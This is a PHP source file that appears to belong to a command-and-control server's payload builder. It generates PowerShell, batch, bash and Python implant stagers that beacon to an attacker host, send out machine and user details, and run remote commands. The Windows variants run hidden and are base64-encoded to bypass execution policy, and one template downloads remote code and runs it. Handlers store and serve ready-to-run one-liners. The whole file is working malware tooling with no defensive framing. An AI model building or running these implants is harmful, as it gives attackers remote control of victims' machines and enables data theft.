<?php
declare(strict_types=1);

function getTemplates(): array {
    return [
        'windows_powershell' => [
            'name' => 'Windows PowerShell Stager',
            'ext' => '.ps1',
            'template' => 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC_B64',
            'code' => function($c2, $port, $secret) {
                $url = "http://{$c2}:{$port}";
                $code = '$s="'.$url.'";$k="'.$secret.'";$u=[GUID]::NewGuid().ToString();while(1){try{$r=Invoke-RestMethod -Uri "$s/api.php?action=beacon" -Method POST -Headers @{Authorization="Bearer $k"} -Body (@{uuid=$u;hostname=$env:COMPUTERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption;username=$env:USERNAME;privilege="user";pid=$pid;ip=(Get-NetIPAddress -AddressFamily IPv4|Where{$_.IPAddress -notmatch "^(127|169)"}|Select -First 1).IPAddress}|ConvertTo-Json) -ContentType "application/json";foreach($t in $r.tasks){$o=iex $t.command 2>&1|Out-String;Invoke-RestMethod -Uri "$s/api.php?action=result" -Method POST -Headers @{Authorization="Bearer $k"} -Body (@{task_id=$t.id;beacon_uuid=$u;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json"}Start-Sleep -Seconds $r.sleep}catch{Start-Sleep 10}}';
                return base64_encode_ps($code);
            }
        ],
        'windows_bat' => [
            'name' => 'Windows Batch Stager',
            'ext' => '.bat',
            'template' => 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $ENC_B64',
            'code' => function($c2, $port, $secret) {
                $psCode = (new class($c2,$port,$secret) {
                    function __construct($c,$p,$s) {$this->c=$c;$this->p=$p;$this->s=$s;}
                    function get() {
                        $url = "http://{$this->c}:{$this->p}";
                        return '@echo off&powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ' . base64_encode_ps(
                            '$s="'.$url.'";$k="'.$this->s.'";$u=[guid]::NewGuid().ToString();while(1){try{$r=invoke-restmethod -Uri "$s/api.php?action=beacon" -Method POST -Headers @{Authorization="Bearer $k"} -Body (@{uuid=$u;hostname=$env:computername;os=(gwmi win32_operatingsystem).caption;username=$env:username;privilege="user";pid=$pid;ip=(gip -AddressFamily IPv4|?{$_.IPAddress -notmatch "^(127|169)"}|select -First 1).IPAddress}|convertto-json) -ContentType "application/json";foreach($t in $r.tasks){$o=iex $t.command 2>&1|out-string;invoke-restmethod -Uri "$s/api.php?action=result" -Method POST -Headers @{Authorization="Bearer $k"} -Body (@{task_id=$t.id;beacon_uuid=$u;output=$o;status="completed"}|convertto-json) -ContentType "application/json"}sleep $r.sleep}catch{sleep 10}}'
                        );
                    }
                })->get();
                return $psCode;
            }
        ],
        'windows_exe' => [
            'name' => 'Windows Executable (stub)',
            'ext' => '.exe',
            'template' => 'EXE placeholder - compile with: python3 -c "import urllib.request; exec(urllib.request.urlopen(\'$C2_URL/payload.txt\').read())"',
            'code' => function($c2, $port, $secret) {
                return '[EXE STUB] Use PowerShell stager instead. Compile with your preferred tool.';
            }
        ],
        'linux_bash' => [
            'name' => 'Linux Bash Stager',
            'ext' => '.sh',
            'template' => 'bash -c "$(echo $ENC_B64 | base64 -d)"',
            'code' => function($c2, $port, $secret) {
                $url = "http://{$c2}:{$port}";
                $respVar = 'RESP';
                $tasks = 'TASKS';
                return '#!/bin/bash
C2="'.$url.'"
SECRET="'.$secret.'"
UID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "b-$$-$(date +%s)")
while true; do
  R=$(curl -s -X POST "${C2}/api.php?action=beacon" -H "Authorization: Bearer ${SECRET}" -H "Content-Type: application/json" -d "{\"uuid\":\"${UID}\",\"hostname\":\"$(hostname)\",\"os\":\"$(uname -o)\",\"username\":\"$(whoami)\",\"privilege\":\"user\",\"pid\":$$,\"ip\":\"$(hostname -I | awk \'{print $1}\')\"}" 2>/dev/null)
  if [ -n "$R" ]; then
    TS=$(echo "$R" | python3 -c "import sys,json;d=json.load(sys.stdin);[print(json.dumps(t)) for t in d.get(\"tasks\",[])]" 2>/dev/null)
    SL=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin).get(\"sleep\",10))" 2>/dev/null)
    [ -z "$SL" ] && SL=10
    if [ -n "$TS" ]; then
      echo "$TS" | while read -r T; do
        TI=$(echo "$T" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"id\"])")
        CM=$(echo "$T" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"command\"])")
        O=$(eval "$CM" 2>&1)
        curl -s -X POST "${C2}/api.php?action=result" -H "Authorization: Bearer ${SECRET}" -H "Content-Type: application/json" -d "{\"task_id\":${TI},\"beacon_uuid\":\"${UID}\",\"output\":\"$(echo "$O" | python3 -c "import sys,json;print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "$O")\",\"status\":\"completed\"}" >/dev/null 2>&1
      done
    fi
  fi
  sleep ${SL:-10}
done';
            }
        ],
        'linux_python' => [
            'name' => 'Linux Python Stager',
            'ext' => '.py',
            'template' => 'python3 -c "import base64,sys;exec(base64.b64decode(sys.argv[1]))" $ENC_B64',
            'code' => function($c2, $port, $secret) {
                $url = "http://{$c2}:{$port}";
                return '#!/usr/bin/env python3
import os, sys, json, time, uuid, subprocess, urllib.request, urllib.error
C2 = "'.$url.'"
SECRET = "'.$secret.'"
BEACON_UUID = str(uuid.uuid4())
HOSTNAME = __import__("platform").node()
OS = __import__("platform").system() + " " + __import__("platform").release()
USERNAME = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
def req(action, data):
    h = {"Authorization": f"Bearer {SECRET}", "Content-Type": "application/json"}
    r = urllib.request.Request(f"{C2}/api.php?action={action}", data=json.dumps(data).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return json.loads(resp.read().decode())
    except: return None
while True:
    try:
        resp = req("beacon", {"uuid": BEACON_UUID, "hostname": HOSTNAME, "os": OS, "username": USERNAME, "privilege": "user", "pid": os.getpid(), "ip": "0.0.0.0"})
        if resp:
            for t in resp.get("tasks", []):
                try:
                    out = subprocess.check_output(t["command"], shell=True, stderr=subprocess.STDOUT, timeout=60).decode(errors="replace")
                except subprocess.TimeoutExpired: out = "[TIMEOUT]"
                except Exception as e: out = f"[ERROR] {e}"
                req("result", {"task_id": t["id"], "beacon_uuid": BEACON_UUID, "output": out, "status": "completed"})
            time.sleep(resp.get("sleep", 10))
        else: time.sleep(30)
    except: time.sleep(10)';
            }
        ],
    ];
}

function base64_encode_ps(string $input): string {
    $out = '';
    for ($i = 0; $i < strlen($input); $i++) {
        $out .= $input[$i] . "\x00";
    }
    return rtrim(base64_encode($out), '=');
}

function handlePayloads(): void {
    requireMethod('GET');
    $db = DB::connect();
    $payloads = $db->all('payloads');
    usort($payloads, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
    $templates = [];
    foreach (getTemplates() as $k => $t) {
        $templates[] = ['key' => $k, 'name' => $t['name'], 'ext' => $t['ext'], 'template' => $t['template']];
    }
    jsonOut(['saved' => $payloads, 'templates' => $templates]);
}

function handlePayload(): void {
    $db = DB::connect();
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = jsonInput();
        $name = trim($input['name'] ?? '');
        $type = $input['type'] ?? '';
        $c2 = trim($input['c2_server'] ?? '');
        $port = trim($input['port'] ?? '80');
        $templates = getTemplates();
        if (empty($name) || empty($type) || empty($c2) || !isset($templates[$type])) jsonError('Invalid payload params');
        $code = $templates[$type]['code']($c2, $port, BEACON_SECRET);
        $db->insert('payloads', [
            'name' => $name, 'type' => $type, 'c2_server' => $c2, 'port' => $port,
            'content' => $code, 'created_at' => now(),
        ]);
        jsonOut(['status' => 'created'], 201);
    } else {
        $id = (int)($_GET['id'] ?? 0);
        if (!$id) jsonError('Missing id');
        $p = $db->findOne('payloads', 'id', $id);
        if (!$p) jsonError('Not found', 404);
        jsonOut($p);
    }
}

function handlePayloadDelete(): void {
    requireMethod('POST');
    $input = jsonInput();
    $id = (int)($input['id'] ?? 0);
    if (empty($id)) jsonError('Missing id');
    DB::connect()->delete('payloads', 'id', $id);
    jsonOut(['status' => 'ok']);
}

function handlePayloadGenerate(): void {
    requireMethod('POST');
    $input = jsonInput();
    $type = $input['type'] ?? '';
    $c2 = trim($input['c2_server'] ?? '');
    $port = trim($input['port'] ?? '80');
    $templates = getTemplates();
    if (empty($type) || empty($c2) || !isset($templates[$type])) jsonError('Invalid params');
    $code = $templates[$type]['code']($c2, $port, BEACON_SECRET);
    $b64 = base64_encode($code);
    $oneliner = $templates[$type]['template']
        ? str_replace(['$ENC_B64', '$C2_URL'], [$b64, "http://{$c2}:{$port}"], $templates[$type]['template'])
        : '';
    jsonOut([
        'code' => $code,
        'filename' => 'payload_' . $type . $templates[$type]['ext'],
        'oneliner' => $oneliner,
    ]);
}
